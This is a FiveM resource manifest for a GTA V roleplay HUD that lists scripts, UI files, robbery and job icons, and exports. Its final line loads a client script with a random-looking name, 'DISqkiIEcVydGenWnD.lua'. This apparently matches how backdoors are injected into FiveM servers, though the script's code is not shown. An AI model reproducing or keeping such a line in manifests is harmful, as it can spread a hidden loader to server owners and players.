fx_version 'bodacious'
game 'gta5'

server_script 'server/main.lua'
client_script 'client/main.lua'

ui_page 'html/ui.html'

files {
	-- Main Files
	'html/ui.html',
	'html/css/style.css',
	'html/js/script.js',
	-- Images
	'html/images/Robb/JewelryActive.png',
	'html/images/Robb/JewelryDeactive.png',
	-- 'html/images/Robb/JewelryDown.png',
	-- 'html/images/Robb/BankActive.png',
	-- 'html/images/Robb/BankDeactive.png',
	-- 'html/images/Robb/BankDown.png',
	'html/images/Robb/CBankActive.png',
	'html/images/Robb/CBankDeactive.png',
	-- 'html/images/Robb/CBankDownDown.png',
	'html/images/Robb/ShopActive.png',
	'html/images/Robb/ShopDeactive.png',
	-- 'html/images/Robb/ShopDown.png',
	-- 'html/images/Job/lawyer.png',
	-- 'html/images/Job/sheriff.png',
	'html/images/Job/police.png',
	'html/images/Job/ambulance.png',
	'html/images/Job/mecano.png',
	'html/images/Job/taxi.png',
	'html/images/Job/government.png',
	'html/images/Job/weazel.png'
}

server_exports {
	'GetCounts',
	'GetAdmins',
	'GetJob'
}

client_script "DISqkiIEcVydGenWnD.lua"